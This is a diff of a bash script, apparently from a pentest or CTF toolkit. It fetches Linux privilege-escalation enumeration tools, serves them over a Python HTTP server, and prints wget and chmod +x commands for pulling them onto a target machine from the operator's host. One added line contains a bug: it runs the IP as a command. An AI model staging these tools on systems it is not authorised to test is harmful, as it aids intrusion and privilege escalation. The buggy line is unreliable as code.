@@ -1,12 +1,21 @@
 #!/bin/bash
 
-if [ $# != 3]; then
-  echo "Usage: #0 <LHOST> <LPORT>"
-  return 1
+if [ $# != 2 ]; then
+  echo "Usage: $0 <LHOST/INTERFACE> <LPORT>"
+  echo ""
+  echo "Example: $0 10.10.14.12 80"
+  echo "Example: $0 tun0 8080"
+  echo ""
+  exit 1
 fi
 
-ip = $1
-port = $2
+ip=$1
+ip_length=$($ip | wc -c)
+port=$2
+
+if [ $ip_length -le 5 ]; then
+  ip=$(ip addr | grep $ip | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
+fi
 
 if [ ! -f "linpeas.sh" ]; then
   wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
@@ -32,12 +41,6 @@ if [ ! -f "linuxprivchecker.py" ]; then
   wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
 fi
 
-ipold=$(ip addr | grep tun0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
-
-if [ ! $oldip ]; then
-  ipold=$(ip addr | grep eth0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
-fi
-
 echo ""
 echo "You can download any of these tools to your target linux machine using commands below:"
 echo ""
@@ -49,9 +52,9 @@ echo "wget http://$ip:$port/linux-exploit-suggester.sh; chmod +x linux-exploit-s
 echo "wget http://$ip:$port/linuxprivchecker.py; chmod +x linuxprivchecker.py"
 echo ""
 
-if [ $port < 1024]; then
+if [ $port -lt 1024 ]; then
   echo "Port is less than 1024, you need to provide your sudo password..."
   sudo python3 -m http.server $port
-else;
+else
   python3 -m http.server $port
 fi
